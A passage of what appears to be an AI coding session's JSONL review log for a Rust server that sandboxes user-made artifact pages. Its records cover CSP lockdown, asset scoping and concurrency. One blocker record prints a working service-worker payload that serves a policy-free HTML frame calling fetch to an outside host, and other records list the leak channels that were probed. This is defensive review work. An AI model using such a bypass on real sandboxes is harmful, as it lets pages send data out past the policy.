images","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T04:55:15.997737Z","id":"7d016e91ec15141ff8f3088097ac573d4e988df0930a1b1c3186f93255b6e596","body":{"kind":"resolve","ref":"git:20e1ed98c3fc","summary":"Taken in 20e1ed98c3fc: connect-src now names the page's own files ('self' on the artifact origin, which serves only GET/HEAD of its content, /_clax/, /_blob/, /healthz; http://<Host>/c/<id>/ on the main origin) and /_blob/. Evidence: npx playwright test e2e/lockdown.spec.ts: 3 passed (both modes: fetch('own.js') 200; another host, <daemon>/api/artifacts and <daemon>/healthz refused with connect-src violations; subdomain clip of the page's own red image has >1000 red pixels, which was 0 under connect-src 'none'); cargo test -p clax-server --test integration: 518 passed (an_artifacts_own_files_and_host_refuse_every_write: POST/PUT/PATCH/DELETE on /c/<id>/..., and on the artifact host's /v/, /_clax/, /_blob/, /healthz, /api/... answer 404 or 405); full e2e 485 passed, 48 skipped, 0 failed.","supersedes":"c26d881aff49036de5683b638a417db41a9f22b17acab2d378ed04e5a3e217dd","tags":["session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T05:01:59.085895Z","id":"1a392b7057074abc708935da50a890e2d8614882062aeae544525d7f12911dd0","body":{"detail":"Failure: an artifact with sw.js (`self.onfetch = e => { if (e.request.url.endsWith('/pwn.html')) e.respondWith(new Response('<script>fetch(\"http://any-host/x\")</script>', {headers: {'content-type': 'text/html'}})) }`) calls navigator.serviceWorker.register('sw.js') (worker-src falls back to script-src, which has the page's own origin), then frames 'pwn.html': the frame's document comes from the worker's Response, which has no Content-Security-Policy, so its fetch reaches the other host and reads the answer. Reproduced with a Playwright probe in Chromium and WebKit (other host logged GET /sw-doc-fetch; the frame posted the body back). The worker stays registered for the artifact origin's /v/<n>/ scope across loads. Android WebView supports service workers; WKWebView engine behaviour matches the WebKit probe. Sandbox mode is not affected (no service workers without allow-same-origin).","kind":"blocker","span":{"start":{"line":94},"end":{"line":101},"content_hash":"59028e76bba4760744f6c41f5671aa945b3d3d94820c6b5fac4b6f989b3b6538"},"suggested_fix":"Refuse service worker scripts: answer 403/404 on content routes (both origins) to a request carrying the `Service-Worker: script` header, which Chromium and WebKit send on registration and update; or drop 'self' from worker-src (`worker-src blob:`), at the cost of workers from the page's own files. Add a lockdown.spec.ts case that expects register('sw.js') to reject.","summary":"In subdomain mode a page registers a service worker from its own files and answers a frame with a synthetic document that carries no policy, which then fetches anywhere","tags":["review","security","N4","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T05:01:59.086114Z","id":"509917271b669e561a235d57179f64716c898e028a334c2249a6af25705474e1","body":{"detail":"/_blob/<asset ID> (crates/clax-server/src/routes/assets.rs blob) looks the asset up globally and does not check it belongs to the artifact whose page asks; the policy admits the whole /_blob/ prefix on each daemon host. Exposure is bounded by asset IDs being ULIDs with 80 random bits (see a079b42a for the same-millisecond neighbour case) and by a page having no way to list other artifacts' assets. The lockdown's stated rule is that a page loads only its own files and assets.","kind":"concern","span":{"start":{"line":103},"end":{"line":123},"content_hash":"399a4a597b21e2c22bccee39df895a523de2003f7492b2e660063d6d2e8c42d8"},"suggested_fix":"Serve assets under an artifact-scoped path (for example /_blob/<artifact ID>/<asset ID>, checked against the asset's artifact) and name only that prefix in the policy; or accept and record a waiver.","summary":"connect-src and default-src name /_blob/ for every artifact, so a page can read any artifact's assets whose asset ID it knows, not only its own","tags":["review","security","N4","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T05:01:59.086924Z","id":"ee4b0d275a6cf4754585c81d57bb476c65e4706ddd7519c4734f96398098d3c3","body":{"detail":"Playwright probe on a scratch daemon, a page adding <link rel=preconnect href=http://localhost:<other port>>: WebKit (sandbox and subdomain) gave the other server one connection with no request; Chromium none. A connection to a page-chosen host name and port is a DNS and connection-timing channel of the same class as dns-prefetch. Under both engines and both frame modes the probe found refused: fetch, XHR, WebSocket, EventSource, sendBeacon, dynamic import, img, script, stylesheet, @import, @font-face, inline style url(), video, poster, audio, track, prefetch, preload, modulepreload, svg image, input type=image, iframe, embed, object, form post, a[ping], data:/blob:/srcdoc iframes, blob:/data: dedicated workers, blob: shared workers, and a page-added <meta> CSP of connect-src * (policies only intersect).","kind":"comment","references":"acc78b60bbbc64c21bbd8e47ba61273646c2b6185349fb0d5177c129299f9c07","span":{"start":{"line":80},"end":{"line":94},"content_hash":"a87cd46257165c8bc300e6801ebf5bd062b87619df802f2cca9bc8b1d8112705"},"summary":"WebKit also opens a TCP connection for <link rel=preconnect> to another host under this policy; Chromium did not","tags":["review","security","N4","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T05:09:24.502136Z","id":"0761f760999580b6cfbab1d7f825b7bf43f04b6328b0b708f925d330290dec47","body":{"kind":"resolve","ref":"git:20e1ed98c3fc","summary":"Fixed in 20e1ed98c3fc: a request carrying Service-Worker: script on an artifact host or under /c/ is answered with host::SERVICE_WORKER_KILL_SWITCH (installs, unregisters itself, no fetch handler), so a page's own worker script never runs and a worker registered earlier is replaced and removed at its next update check. A 403 was not used: it leaves an already registered worker in place. Evidence: api_content::a_service_worker_script_on_content_is_one_that_unregisters_itself passes; e2e/lockdown.spec.ts 'neither …' in chromium and webkit, both modes, 4 passed: after register('sw.js') the registrations drop to 0, framing pwn.html gets no synthetic document and the other host gets no request; with the borrowed-frame half removed, the same spec failed in both engines' subdomain mode against the build of 20e1ed98c3fc (registrations stayed 1).","supersedes":"1a392b7057074abc708935da50a890e2d8614882062aeae544525d7f12911dd0","tags":["reason:fixed","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T05:09:24.503563Z","id":"60ce2c1790f61087a5cef3aa3e97b5f23be9b7f69f5b02f0c26d3457746472bc","body":{"detail":"Not done: it needs a daemon route change (crates/clax-server/src/routes/assets.rs blob looks assets up by asset ID alone, and asset URLs already handed to pages and agents name /_blob/<asset ID>), a redirect or dual route for existing URLs, and the asset_upload result's url to change. Until then the policy admits /_blob/ for every artifact, bounded by asset IDs' 80 random bits and pages having no way to list another artifact's assets.","kind":"alternative","references":"509917271b669e561a235d57179f64716c898e028a334c2249a6af25705474e1","span":{"start":{"line":106},"end":{"line":124},"content_hash":"3704e6a40883d6bbe366c20f684efdbb1eb1e39a9c648c51997497b547b48664"},"summary":"Artifact-scoped asset URLs (/_blob/<artifact ID>/<asset ID>) so the policy names only the page's own assets","tags":["revisit:when assets get artifact-scoped URLs, or asset IDs become guessable or listable","status:needs-decision","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T05:09:24.503619Z","id":"4210c79191a11f0552e52b52eaf9f1b90176e87ed0a15b1427783de3ac92db40","body":{"kind":"comment","references":"acc78b60bbbc64c21bbd8e47ba61273646c2b6185349fb0d5177c129299f9c07","summary":"Also <link rel=preconnect> in WebKit: under this policy WebKit opens a TCP connection (no request) to a page-chosen host and port; Chromium does not. No CSP directive governs it, so it joins navigation, WebRTC and dns-prefetch as a host-name and timing channel. Proposed for the owner to accept as a risk.","tags":["status:needs-decision","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T12:26:55.313891Z","id":"eda32d4bc985ea4bc15c9aaad4087031d042f4a60b30be061f025fe8d3b805b8","body":{"kind":"resolve","ref":"git:20e1ed98c3fc","summary":"Fixed in 20e1ed98c3fc (owner's decision 2026-10-14, quoted: \"Scope assets per app\"): assets are served at /_blob/<artifact ID>/<asset ID> only for the owning artifact (routes/assets.rs scoped_blob, 404 otherwise); on <id>.localhost /_blob/<asset> and /_blob/<id>/<asset> map to that artifact's prefix (host.rs); the content policy names http://<host>/_blob/<id>/ only. Evidence: cargo nextest run -p clax-server -p clax-mcp -p clax-cli: 1114 passed (api_assets::an_asset_is_served_only_under_its_own_artifact: A's asset 200 under /_blob/<A>/, 404 under /_blob/<B>/ and on B's origin by either path; api_content asserts no bare /_blob/ source); npx playwright test e2e/lockdown.spec.ts -g 'own assets': subdomain and sandbox passed: own asset loads (absolute, and root-relative on its origin); another app's asset by its URL, under this app's prefix, by the old /_blob/<asset> URL and root-relative never loads; fetching it is refused. Full e2e 489 passed, 2 failed (echo-chrome, passed 31/31 alone).","supersedes":"509917271b669e561a235d57179f64716c898e028a334c2249a6af25705474e1","tags":["reason:fixed","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T12:26:55.315502Z","id":"2b9e2936562cd139466cd10f11692623096f7648665db11901018cc420b7d272","body":{"kind":"resolve","ref":"git:20e1ed98c3fc","summary":"Taken in 20e1ed98c3fc on the owner's decision of 2026-10-14 (\"Scope assets per app\"); see the resolve of 50991727 for the evidence.","supersedes":"60ce2c1790f61087a5cef3aa3e97b5f23be9b7f69f5b02f0c26d3457746472bc","tags":["reason:fixed","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T12:26:55.316976Z","id":"cfdaf271377406e6f6ef239a7cd36f3205e59bf6801e3c789083b063ce0986af","body":{"kind":"waiver","references":"acc78b60bbbc64c21bbd8e47ba61273646c2b6185349fb0d5177c129299f9c07","summary":"Accepted risk, quoting the owner's decision of 2026-10-14 on the WebKit <link rel=preconnect> channel (ee4b0d27, 4210c791): \"Accept the risk\". WebKit opens a TCP connection, sending no request, to a host and port the page chooses; no CSP directive governs it.","tags":["decision:owner-2026-10-14","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/assets.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T12:26:55.317038Z","id":"e17157784b13f6605c9a043f82a90898bde36527d7d72fdb9619c349566d0ab4","body":{"detail":"web/contract/0.2.61/assets.d.ts tells pages to rebuild a stored asset's URL as \"/_blob/\" + id, resolving from every page. On an artifact's origin host.rs maps it to /_blob/<id>/<asset>, so it works; in sandbox mode (LAN viewers, or when artifact origins are unavailable) it resolves to the main origin's unscoped /_blob/<asset>, which the content policy no longer admits (only /_blob/<artifact ID>/). docs/contract.md ('Runtime capabilities in detail', assets) now says to rebuild as \"/_blob/<artifact ID>/\" + id there, but a page following the d.ts alone shows broken images in sandbox mode. Options: accept it; allow the unscoped prefix for display only in sandbox mode and drop Access-Control-Allow-Origin on the unscoped route (another app's asset then shows but cannot be read); or have the bridge rewrite /_blob/<asset> URLs in sandbox mode.","kind":"concern","span":{"start":{"line":130},"end":{"line":146},"content_hash":"81ff983741b8afedfc8bc12d721f23956b9399585c545dac1a6a48953b19b773"},"summary":"In a sandboxed frame a page's root-relative \"/_blob/\" + id no longer loads its asset","tags":["status:needs-decision","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/assets.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T12:34:00.232828Z","id":"db3aa1ff9c91e11914795fa9edf955f8f522f22c54e64cc65c10a09683642b95","body":{"kind":"resolve","ref":"git:647958f22844","summary":"Fixed in 647958f22844 (decision recorded by the coordinator, status:decided): pages use the URL the assets API returns or claude.assetUrl(id) (bridge, web/contract/clax-extensions.d.ts), which gives /_blob/<artifact ID>/<asset ID> in both frame modes; docs/contract.md Runtime capabilities and the four SKILL copies say never to build \"/_blob/\" + id. web/contract/0.2.61/assets.d.ts stays upstream bytes (routes::shell::tests::the_contract_files_are_the_upstream_bytes); clax-extensions.d.ts states the departure. Evidence: npx playwright test e2e/lockdown.spec.ts -g 'own assets': sandbox and subdomain passed: the returned URL and claude.assetUrl(id) load, the old root-relative form loads on the artifact origin and is refused in the sandboxed frame; vitest bridge 361 passed; nextest clax-server 698 passed; full e2e 491 passed, 0 failed; eager bridge 6105 gzip bytes (budget 6144).","supersedes":"e17157784b13f6605c9a043f82a90898bde36527d7d72fdb9619c349566d0ab4","tags":["session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/net.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T21:03:50.989223Z","id":"e4c4451640899d1f58d13d926c743178d680fc08673289efde45c485cb5c1981","body":{"detail":"FetchBody.body is a JSON string sent as its UTF-8 bytes (line 94), and the bridge (web/bridge/src/caps/net.ts netLocals) passes only a string body, so an image or other binary upload is impossible. Responses are byte-exact since 20e1ed98c3fc (body_base64). A body_base64 request field, exclusive with body, and an ArrayBuffer/Blob body in the bridge would close it.","kind":"concern","span":{"start":{"line":34},"end":{"line":42},"content_hash":"246f78ca691c2b2f8b146a32ee47552040b2128fe0651599edd5f97575321747"},"summary":"net:fetch takes request bodies as text only: a page cannot upload binary data","tags":["status:deferred","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/net.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T21:04:03.842666Z","id":"c084195f08243272da56dc21e882d415c05a6ae6041b476b3711209bd6f0fd2b","body":{"kind":"resolve","ref":"git:20e1ed98c3fc","summary":"Responses are byte-exact: a body that is not UTF-8 comes as body_base64 and the page's response has arrayBuffer() and blob(). Evidence: cargo test -p clax-server --test integration api_net (2 passed; a .png answer arrives as body_base64 iVBOR/8A) and npx vitest run bridge/test/net.test.ts (4 passed). Binary request bodies remain, as concern e4c44516.","supersedes":"eb001eafcde245219839574a526940d550d710eae272da026c4c2faf7b22a50d","tags":["reason:fixed","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-14T21:09:58.384399Z","id":"7f8716415282c4ed4c1f26fe0d7a13ac43c797aebb23c272c2b0dd561b9e7d5e","body":{"detail":"script-src and default-src allow blob: and data:, and script-src allows 'unsafe-eval'. A page could already run code fetched as text from a granted host (net.fetch(...).text() then eval, or new Blob([text]) as a <script src=blob:>), so body_base64, arrayBuffer() and blob() (crates/clax-server/src/routes/net.rs fetch, web/bridge/src/caps/net.ts netResponse) add no new code-execution path: granting a host already means trusting what the page does with its answers, inside the same lockdown. What the lockdown does rely on is that a document the page makes from such bytes (an iframe at a blob: or data: URL of text/html) cannot reach the network. A throwaway Playwright probe (an artifact framing a blob: and a data: text/html document whose script fetches and loads an image from another 127.0.0.1 port, plus the parent calling the blob frame's contentWindow.fetch, plus a blob: <script>) saw zero requests at the other host in Chromium and WebKit, subdomain and sandbox modes: the blob frame's fetch was refused and the data frame's window unreachable. web/e2e/lockdown.spec.ts has no such case, so a policy or engine change could open it unnoticed.","kind":"suggestion","span":{"start":{"line":94},"end":{"line":101},"content_hash":"59028e76bba4760744f6c41f5671aa945b3d3d94820c6b5fac4b6f989b3b6538"},"suggested_fix":"Add the blob:/data: frame case to web/e2e/lockdown.spec.ts's engine loop (line 132), expecting the other host to see no request.","summary":"No lockdown case pins that blob: and data: frames inherit this policy; the net binary bodies (20e1ed98c3fc) rely on it no more than text bodies already did","tags":["review","security","K3","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-15T01:43:18.710889Z","id":"d6bc7b2f8e7e7773e5d30c1aeb93f39461b79b8ce50b31b26d2fd04f3ce850b7","body":{"kind":"resolve","ref":"git:647958f22844","summary":"Fixed in 647958f22844/647958f22844: web/e2e/lockdown.spec.ts \"blob: and data: frames of text/html, and a blob: script, reach no other host\" in chromium and webkit, subdomain and sandbox: 4 passed, each frame's script ran and its fetch and image were refused, away.hits() 0.","supersedes":"7f8716415282c4ed4c1f26fe0d7a13ac43c797aebb23c272c2b0dd561b9e7d5e","tags":["reason:fixed","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/mod.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-16T14:09:51.071852Z","id":"1defaa4364cd16d4b357b71ceceac2b52a17e992516bf7802b79293dce8e200d","body":{"detail":"API JSON, the shell's pages and bundles, and the bridge are compressed (crate::http_cache::compression(), lines 261, 295, 305); wrapped pages and supporting files under /c/... (and on artifact origins) are not. On loopback this costs little; on a LAN view it lengthens link to first paint. Time to usable on a LAN link has not been measured before and after compression.","kind":"concern","span":{"start":{"line":462},"end":{"line":464},"content_hash":"03461796f42a4caaafb7403f510841b3ef9f0129ed6dfb6f95dd2f2084ce5819"},"summary":"Published pages and their files go out uncompressed","supersedes":"58014460770808acbe27ecd079b82834f25f4f9d0930e81b89e1e9d19015872d","tags":["perf","session:claude-code:4661063b-b304-434f-95f6-59a30e211068","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/mod.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-16T14:09:51.094335Z","id":"15a9b17b513271c3065850bafe08845246a62641a9fe77f9c608de099c8224c6","body":{"detail":"CONTENT_VIEWS and PEOPLE_VIEWS list the calls that build views in this codebase (thread_view(, with_owner(, list_versions(, doc_get(, working.for_artifact(, question_view(, inbox_views(, grant_view(, Sse::new(, ...). A handler that serialises an Artifact or a Version directly (json!({\"artifact\": a})) or calls a helper that does is not seen. MUST_REFUSE pins the routes spec §7.5 names.","kind":"concern","span":{"start":{"line":1438},"end":{"line":1454},"content_hash":"6ec9bc8ee81272d9f46890e14be86cddb3beafb6cac1fd945514d5e593b4f5dc"},"summary":"The Own and not_for_agents guards recognise views by source text","supersedes":"04c719932bca1a4f628bc4e8f6ee5a4494de2062931f30d79a969230e9aae1be","tags":["session:claude-code:4661063b-b304-434f-95f6-59a30e211068","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/mod.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-16T14:09:51.112408Z","id":"4014c49aa8e71a035180beb01af0db3cfc87453eea76a598b30342be6a5d3485","body":{"detail":"Spec §8.6 allowlists two direct spawns. plugins/pi/src/daemon.ts also runs `<bin> --version` (binaryVersion) and `ensure-clax.sh` with no arguments (findBinary, which prints the binary's path). Neither reaches the daemon or the model's context, so the guard accepts them.","kind":"waiver","span":{"start":{"line":1836},"end":{"line":1862},"content_hash":"b10b976153597d51ca9c9e38ffd71c56521a63209bf872bc9508fdcd811d7d15"},"summary":"Pi may run the binary directly for --version, and the wrapper with no arguments, beside serve --json and status --json","supersedes":"b191b747efdf526f66500e1f5b84193a805536a92e9729b67d104477c569a2eb","tags":["session:claude-code:4661063b-b304-434f-95f6-59a30e211068","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/app_drafts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-18T12:19:34.874277Z","id":"4df76817a1ffa9ab4fef670573117229bedf5342ae39902d4c18bfa5c615fbe7","body":{"detail":"akesling/clax-artifacts brought its own drafts (an agent's in-memory work in progress: crates/clax-server/src/routes/drafts.rs, clax_core::drafts, clax_realtime::drafts, /api/sessions/{id}/drafts/{aid}, /api/artifacts/{aid}/drafts, /c/{aid}/draft/...). The paths do not collide, so the Clax app's client was left unchanged; the store module clax_store::drafts keeps its name. Not taken: renaming the app's routes (for example /api/app-drafts) and the app's client with them, which would leave one meaning of 'draft' per path.","kind":"alternative","span":{"start":{"line":1},"end":{"line":12},"content_hash":"28238daccc33eb8f99a70a7e9026a0d7df071d9b4a060e2c40783315f6cfd42b"},"summary":"The app's hidden draft artifacts keep their HTTP paths (/api/drafts) and only their route module and test file were renamed (app_drafts, api_app_drafts) beside the base's agent drafts","tags":["drafts","rebase","revisit:the two draft kinds are unified, or a second client uses /api/drafts","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/assets.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-18T12:19:34.874385Z","id":"c77dab90b9c8c7745938c1a4e13ee1063f66716810f66add2b43819fb74ab280","body":{"detail":"The scoped asset URL (/_blob/<artifact>/<asset>) is given only on a local daemon; clax_http::hosted::asset_url keeps the base's keyed form. Whether a hosted page's lockdown policy (crates/clax-http/src/content_policy.rs) admits its content origin's keyed asset URLs was not checked in this rebase.","kind":"concern","span":{"start":{"line":101},"end":{"line":111},"content_hash":"679669937e63e36cfdf09c3ff290e0116ced3f69915e3b297397281e77fc1cd5"},"summary":"A hosted daemon's asset URLs stay unscoped (/_blob/<asset>?k= on its content origin) while the lockdown policy names only /_blob/<id>/ on the request's hosts","tags":["hosted","assets","rebase","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/assets.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-18T13:51:40.476197Z","id":"3ff59bfc35d634540a6876793d3ab840fa1244d03205432b00761f554f6f3e15","body":{"detail":"The scoped asset URL (/_blob/<artifact>/<asset>) is given, and enforced by crates/clax-http/src/host.rs's rewrite, only on a local daemon; clax_http::hosted::asset_url keeps the base's keyed form, which the rewrite passes through on a hosted daemon (api_hosted::content_is_served_only_at_its_key_and_an_id_alone_reads_nothing). Whether a hosted page's lockdown policy (crates/clax-http/src/content_policy.rs) admits its keyed asset URLs was not checked.","kind":"concern","span":{"start":{"line":101},"end":{"line":111},"content_hash":"679669937e63e36cfdf09c3ff290e0116ced3f69915e3b297397281e77fc1cd5"},"summary":"A hosted daemon's asset URLs stay unscoped (/_blob/<asset>?k=), on its content origin and on an artifact origin alike, while the lockdown policy names only /_blob/<id>/ on the request's hosts","supersedes":"c77dab90b9c8c7745938c1a4e13ee1063f66716810f66add2b43819fb74ab280","tags":["hosted","assets","rebase","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T05:49:12.914654Z","id":"022b48905161f43bad03a5ffe9a79f2efa56fbc9f5d2925dfbbc2fd26f81b81b","body":{"detail":"fork_refusal checks read on the source and create at *, and the fork is the forking person's (artifacts.person). Whether they may read it afterwards is their rights' read locations: clax:collaborator reads * so it holds, but rights such as [{read, [<source>]}, {create, [*]}] fork and then answer 404 on the fork (crates/clax-server/tests/api_forks.rs builds such rights). The hosted prototype's owner always reads its own artifact.","kind":"concern","span":{"start":{"line":1087},"end":{"line":1125},"content_hash":"40fe5bd49c9bedfd0cc9e32fbc96f95347e71b7eb3d7f6b06ea15446dca7af0b"},"suggested_fix":"Grant read on own artifacts with create, or refuse create without read at own.","summary":"Rights that grant create but read only named artifacts make a fork its forker cannot open","supersedes":"7f936847ad91890fa1938f81112b8eeefcb37209ffab5bdd4a0915850251bfde","tags":["forks","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T05:49:12.995310Z","id":"4d47284a6ed947a5d3ce6d42e7abe16bc2f409afd84808de3e27ee4fc2c28348","body":{"detail":"routes::artifacts::restore validates and records X-Clax-Session on the version but, unlike publish (same file, from line 621), does not call ensure_watch, working.clear, retarget_untargeted or link the session's working threads: a restore is the owner's undo, not an agent's answer to a thread, so it addresses no thread and leaves the working list alone.","kind":"alternative","span":{"start":{"line":862},"end":{"line":932},"content_hash":"395e92850005392139253661f74b7cf2bead1152de3e0ad09fe4ed77515bbc97"},"summary":"Treat a session's restore like its publish: watch, clear working, link working threads, retarget untargeted threads","supersedes":"87060f60e565fd0c9af4d9152a330a0f06dd4c3c618d1cdc58c29f1bb1e0e6d6","tags":["revisit:an agent session restores a version as its answer to a thread","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T07:34:49.679155Z","id":"7b474ee935d0c90d003c98937f3e089a9ee22dc0bda09c84a5b4b629ba1a9be3","body":{"detail":"fork_refusal checks read on the source and create at *, and the fork is the forking person's (artifacts.person). Whether they may read it afterwards is their rights' read locations: clax:collaborator reads * so it holds, but rights such as [{read, [<source>]}, {create, [*]}] fork and then answer 404 on the fork (crates/clax-server/tests/api_forks.rs builds such rights). The hosted prototype's owner always reads its own artifact.","kind":"concern","span":{"start":{"line":1098},"end":{"line":1136},"content_hash":"40fe5bd49c9bedfd0cc9e32fbc96f95347e71b7eb3d7f6b06ea15446dca7af0b"},"suggested_fix":"Grant read on own artifacts with create, or refuse create without read at own.","summary":"Rights that grant create but read only named artifacts make a fork its forker cannot open","supersedes":"022b48905161f43bad03a5ffe9a79f2efa56fbc9f5d2925dfbbc2fd26f81b81b","tags":["forks","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T07:34:49.731204Z","id":"63e2ff490671d47310262cb89328de49b48d7e1cb220ecff307445ae45a0e763","body":{"detail":"routes::artifacts::restore validates and records X-Clax-Session on the version but, unlike publish (same file, from line 621), does not call ensure_watch, working.clear, retarget_untargeted or link the session's working threads: a restore is the owner's undo, not an agent's answer to a thread, so it addresses no thread and leaves the working list alone.","kind":"alternative","span":{"start":{"line":866},"end":{"line":943},"content_hash":"dac3f86a99173c505860665dddf48b53907eb3cf6e0d5660a268df6930855730"},"summary":"Treat a session's restore like its publish: watch, clear working, link working threads, retarget untargeted threads","supersedes":"4d47284a6ed947a5d3ce6d42e7abe16bc2f409afd84808de3e27ee4fc2c28348","tags":["revisit:an agent session restores a version as its answer to a thread","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/jobs.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T09:10:12.310053Z","id":"091f185da31e38eab5b158528a869b12d7d4cba083d0fbe7bf104766d5af5793","body":{"detail":"require_owner reads AppState.jobs_owners, then the handler runs the job write on the store. A claim released between the two (its stream's connection ending, DELETE /api/jobs/owner) lets that one write land for the old holder. Only one claim exists at a time, so a second claimant's writes are refused until the release, and the old holder's write is one it was entitled to a moment earlier.","kind":"concern","span":{"start":{"line":62},"end":{"line":76},"content_hash":"1633536fcbd1313bf2d0b8e9004ff2627b5a44a20ce41863ece41e0184e4f28b"},"suggested_fix":"If it matters: hold a per-client generation in JobsOwners, pass it into the store call, and check it again inside store_call before the write.","summary":"The queue owner check runs before the store's write, not in it","tags":["review","session:claude-code:e697d918-f48a-41f9-aac4-4be74128e8ae"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/jobs.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T09:19:56.893394Z","id":"6d37915c124f7eb7453210461830d1001aff055c4ff708f84121a73d74cd711d","body":{"detail":"A check run as the transaction's last statement (as publish_step_cut's `cut` runs) can still pass just before a release, which then completes while COMMIT runs: the release never waits for the store. To close the window, release has to wait for the writes admitted under the old token. JobsOwners::enter(client, token) -> Option<WriteGuard> checks holds() and increments the claim's in-flight count under the claims mutex. Each job route holds the guard across its store call, including the async publish step. Releasing or replacing a claim marks it gone at once, so no new enter succeeds. A new claim answers 200 only once the old claim's count reaches zero (claim becomes async and waits on a Notify that the last guard's drop signals). With the guard in place, the check can stay in the route. The store stays unaware of owners (spec §8.1), and no clock is read. The window matters more than this root says: the old owner's late write of a key the new owner also commits is answered version_moved instead of replayed 